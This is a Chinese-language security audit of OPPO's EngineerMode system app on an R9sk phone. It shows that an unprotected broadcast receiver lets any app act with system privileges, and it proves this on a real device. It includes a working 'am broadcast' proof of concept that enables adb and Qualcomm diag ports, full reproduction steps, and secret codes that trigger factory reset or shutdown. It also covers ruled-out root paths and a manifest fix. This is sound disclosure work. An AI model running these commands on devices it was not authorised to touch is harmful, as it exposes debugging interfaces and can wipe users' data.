# 05 · 工程模式审计：真实的 system uid 提权，但到不了 root

> 审计对象：`/system/app/OppoEngineerMode/OppoEngineerMode.apk`
> 方法：拉取 APK → 抠出 odex 里的 dex → baksmali 反编译（1947 个 smali）→ 读 manifest → 实机验证
> 原始证据：`evidence/2026-11-21-oem-manifest.txt`、`evidence/2026-11-21-engineermode-actions.txt`、
> `evidence/2026-11-21-engineermode-live-test.txt`

---

## 0. 结论

| 问题 | 答案 |
| --- | --- |
| 工程模式里有后门吗？ | **有一个未授权广播接收器**，任意 App 可用 |
| 能拿到 root 吗？ | **不能。** 进程是 `system`（uid 1000），不是 `root`（uid 0） |
| 那它有什么用？ | 以 system 身份改系统属性、开 adb、拉起受保护页面、甚至触发恢复出厂 |
| 严重性 | **高**（本地权限提升 App → system），但 Android 6 已 EOL，不会有补丁 |
| 对 root 的帮助 | **零**。`system_app` 域改不了 `/system`，也开不了 `/dev/tun` |

---

## 1. 审计对象

| 项 | 值 |
| --- | --- |
| APK 路径 | `/system/app/OppoEngineerMode/OppoEngineerMode.apk` |
| 包名 | `com.oppo.engineermode` |
| 版本 | `versionCode=23`，`versionName=V1.01` |
| **sharedUserId** | **`android.uid.system`** |
| minSdk / targetSdk | 23 / 23 |
| 组件数 | 264 Activity / 8 Service / 4 Receiver / 1 Provider |
| 签名 | 平台签名（与 `android.uid.system` 匹配） |

### 持有的敏感权限（节选）

```
com.oppo.permission.RUTILCMD
android.permission.WRITE_SECURE_SETTINGS
android.permission.MOUNT_FORMAT_FILESYSTEMS
android.permission.MOUNT_UNMOUNT_FILESYSTEMS
android.permission.REBOOT
android.permission.HARDWARE_TEST
android.permission.WRITE_SETTINGS
android.permission.SEND_SMS
```

> `WRITE_SECURE_SETTINGS` + `REBOOT` + `MOUNT_FORMAT_FILESYSTEMS` 的组合，
> 说明这是一个**平台级**应用，权限远超普通系统 App。

---

## 2. 组件权限矩阵

绝大多数组件都加了 `oppo.permission.OPPO_COMPONENT_SAFE`（签名级权限，只有 OPPO 自家应用能持有）：

```
<activity name=".EngineeringMode" permission="oppo.permission.OPPO_COMPONENT_SAFE" ...>
<service  name="...GpsEnvService" permission="oppo.permission.OPPO_COMPONENT_SAFE" ...>
<receiver name="NvFactoryReceiver" permission="oppo.permission.OPPO_COMPONENT_SAFE" ...>
```

**例外只有两个 Receiver：**

| Receiver | 权限 | 触发方式 | 风险 |
| --- | --- | --- | --- |
| **`EngineerModeActionReceiver`** | **无** | 广播 `com.oppo.engineermode.EngineerModeMain` + `order` extra | **高** |
| `CustomizedResetReceiver` | 无 | 拨号暗码 `*#2674424#`（`android_secret_code`） | 中（需要用户手动拨号） |

Manifest 原文（`evidence/2026-11-21-oem-manifest.txt:786`）：

```xml
<receiver name="com.oppo.engineermode.EngineerModeActionReceiver">
    <intent-filter>
        <action name="com.oppo.engineermode.EngineerModeMain">
```

- 没有 `android:permission`
- 没有 `android:exported="false"`
- targetSdk 23 + 有 intent-filter → **默认 `exported=true`**

---

## 3. 漏洞：未授权广播接收器

### 3.1 代码路径

`EngineerModeActionReceiver.onReceive()` 的逻辑（简化）：

```java
if (!"com.oppo.engineermode.EngineerModeMain".equals(intent.getAction())) return;
String order = intent.getStringExtra("order");
if (order == null) return;

if ("*#8011#".equals(order)) {
    SystemProperties.set("persist.sys.allcommode", "true");
    Settings.Global.putInt(cr, "adb_enabled", 1);
    SystemProperties.set("persist.sys.adb.engineermode", "0");
    SystemProperties.set("persist.sys.oppo.usbactive", "true");
    SystemProperties.set("persist.sys.usb.config", "diag,adb");
    ...
    return;
}

// 其余暗码：查 res/xml/engineermode_action_qcom.xml 映射表
// 找到 action 后，以本进程（system uid）身份 startActivity(...)
```

关键点：**没有任何调用方校验**。不看 calling uid、不看包名、不要求权限。

### 3.2 实机验证（已确认）

在 Termux（uid 10087，SELinux `untrusted_app`，无任何特殊权限）里执行：

```bash
export PATH=/system/bin:$PATH
am broadcast --user 0 \
  -a com.oppo.engineermode.EngineerModeMain \
  --es order "*#8011#"
```

**执行前：**

```
persist.sys.usb.config=mtp
persist.sys.allcommode=
persist.sys.oppo.usbactive=
persist.sys.adb.engineermode=
sys.usb.config=mtp,mass_storage
sys.usb.state=mtp,mass_storage
```

**执行后（3 秒内）：**

```
persist.sys.usb.config=diag,adb      ← 改了
persist.sys.allcommode=true          ← 改了
persist.sys.oppo.usbactive=true      ← 改了
persist.sys.adb.engineermode=0       ← 改了
sys.usb.config=diag,adb              ← 改了
sys.usb.state=diag,adb               ← 改了
```

`SystemProperties.set("persist.*")` 是 **system uid 才能做的操作**，普通 App 调用会直接抛异常。
属性确实变了 → 代码确实以 system 身份执行了 → **提权成立**。

### 3.3 另一个分支：以 system 身份拉起受保护页面

同一方法的后半段：

```java
Intent i = new Intent(action);            // action 来自 XML 映射表
i.putExtra("order", order);
i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
if (isActivityAvailable(context, i)) {
    context.startActivity(i);             // 调用者是 system uid
}
```

由于调用者是 `android.uid.system`，它天然持有 `OPPO_COMPONENT_SAFE`，
所以**能打开那些普通 App 打不开的工程模式页面**。

实测旁证：发送 `*#36446337#`（主工程模式）后，Termux 的 Activity 立即被切到后台
（`am_on_paused_called: [0,com.termux.app.TermuxActivity]`），说明确实有 Activity 被拉起。

---

## 4. 暗码全表（40 条）

完整映射见 `evidence/2026-11-21-engineermode-actions.txt`。重点条目：

| 暗码 | 目标 | 说明 |
| --- | --- | --- |
| `*#8011#` | `NoUI` + **USB 配置切换** | 开 adb / diag，**已实测** |
| `*#36446337#` | `EngineeringMode` | 工程模式主页 |
| `*#801#` | `qualcomm.DiagEnabled` | 开/关 diag |
| `*#800#` | `qualcomm.LogSwitch` | 日志开关 |
| `*#8778#` | `manualtest.MasterClear` | **恢复出厂设置** ⚠️ |
| `*#911#` | `PowerOff` | 关机 ⚠️ |
| `*#9434#` | `com.oppo.decrypt.WifiDecryptionActivity` | Wi-Fi 密码相关 |
| `*#888#` | `PcbShow` | 主板信息 |
| `*#66#` | `IMeiAndPcbCheck` | IMEI 校验 |
| `*#268#` | `qualcomm.QualCommActivity` | 高通测试页 |
| `*#7332#` | `com.oppo.rftoolkit.RfToolkitFactory` | 射频工具（未安装） |

> ⚠️ `*#8778#` 和 `*#911#` 是**破坏性**的。本文档**没有**测试这两条，也不建议测试。

---

## 5. 被排除的两个假设

逆向过程中有两个「看起来像 root 入口」的线索，都已排除。

### 5.1 `ctl.start` → 不是 root shell

dex 里确实有 `ctl.start` / `ctl.stop` 字符串，但唯一使用点是
`wifitest/WifiFTMActivity.smali`：

```java
SystemProperties.set("ctl.stop", "ftmd");
SystemProperties.set("ctl.start", "ftmd");   // 启动 Wi-Fi FTM daemon
```

**只是启动 `ftmd`（Wi-Fi 工厂测试守护进程），不是 `engineermode-sh`，也不是 shell。**

### 5.2 `RUtils` → 命令是硬编码的

`systemchecker/MainActivity.smali` 调用 `com.oppo.rutils.RUtils.RUtilsCmd(String)`，
但所有参数都是硬编码的 `md5sum` / `chown` / `mkdir` 命令，**没有拼接用户输入**：

```java
RUtilsCmd("if [ ! -d data/media/0/oppo_log/md5diff ]; then mkdir -p ...; fi; chown ...")
```

没有注入点，也没有把 `order` extra 传进去的路径。

### 5.3 `init.svc.engineermode-sh`

系统里确实存在这个服务定义（`getprop init.svc.engineermode-sh` → `stopped`），
但在 1947 个 smali 文件里**找不到任何启动它的代码**。
它可能是给工厂治具/串口用的，普通 App 触发不到。

---

## 6. 天花板：为什么不是 root

| 维度 | 工程模式进程 | root |
| --- | --- | --- |
| uid | **1000（system）** | 0 |
| SELinux 域 | `system_app` | `su` / `magisk` |
| 写 `/system` | ❌（只读 + dm-verity） | ✅ |
| 打开 `/dev/tun` | ❌（属 `system:vpn`，但 SELinux 仍拦） | ✅ |
| 改 `selinux_enforcing` | ❌ | ✅ |
| 加载内核模块 | ❌ | ✅ |
| 装 Magisk 模块 | ❌ | ✅ |
| 持久化 | 只能改 `persist.*` 属性 | 完整 |

**一句话**：它是「App → system」的提权，不是「App → root」的提权。
从 `system_app` 到 `root` 之间还隔着一整个 SELinux 策略层和内核提权。

---

## 7. 影响评估

| 能力 | 前提 | 影响 |
| --- | --- | --- |
| 开启 adb（USB） | 任意 App + 物理 USB | 中：需要数据线 + 授权弹窗 |
| 切 USB 到 `diag,adb` | 任意 App | 中：暴露高通诊断口 |
| 打开工程模式页面 | 任意 App | 中：部分页面可改射频/网络参数 |
| **可能触发恢复出厂** | 任意 App（`*#8778#`，取决于 `oppo.customize.function.reset` feature） | **高：数据全丢** |
| 关机 | 任意 App（`*#911#`） | 低 |

**CVSS 粗略评估**：本地、低复杂度、无需权限 → `AV:L/AC:L/PR:N/UI:N`，
影响机密性/完整性/可用性 → 大约 **7.8（High）**。
但这是 2016 年的系统，OPPO 不会修，实际意义是「知道就行」。

---

## 8. 修复建议（如果要自己做 ROM）

```xml
<receiver
    android:name="com.oppo.engineermode.EngineerModeActionReceiver"
    android:exported="false" />
```

或者加一个 signature 级权限。两者取其一即可。

---

## 9. 复现步骤（完整）

```bash
# 1. 确认在 R9sk 上（不是别的机器）
ssh r9sk 'getprop ro.product.model'        # 期望：OPPO R9sk

# 2. 记录当前值
ssh r9sk 'getprop persist.sys.usb.config'   # 期望：mtp

# 3. 发广播（Termux 里 PATH 要包含 /system/bin）
ssh r9sk 'export PATH=/system/bin:$PATH; \
  am broadcast --user 0 \
    -a com.oppo.engineermode.EngineerModeMain \
    --es order "*#8011#"'

# 4. 观察变化
ssh r9sk 'getprop persist.sys.usb.config'   # 期望：diag,adb
```

> **注意**：`--user 0` 不能省。Android 6 的 `am` 默认用 `USER_CURRENT`，
> 普通 App 没有 `INTERACT_ACROSS_USERS`，会报 `SecurityException`。

---

## 10. 副作用与恢复

本次测试把手机 USB 配置从 `mtp` 改成了 `diag,adb`，并开启了 adb。这是**持久属性**，重启后仍然有效。

| 影响 | 说明 |
| --- | --- |
| MTP 文件传输 | 默认不再自动出现（需要手动切回） |
| adb | **已开启**，数据线修好后插上就能用（会弹授权框） |
| diag | 暴露高通诊断口，QPST/QXDM 可连 |

**恢复 MTP 的方法**（任选其一）：

1. 设置 → 开发者选项 → 选择 USB 配置 → **MTP / 文件传输**
2. 设置 → 开发者选项 → 关闭「USB 调试」后重新选择
3. 恢复出厂设置（不推荐）

> 从项目角度，`diag,adb` 其实**有利于**后续 9008/adb 调试——数据线一通，adb 就自动可用。
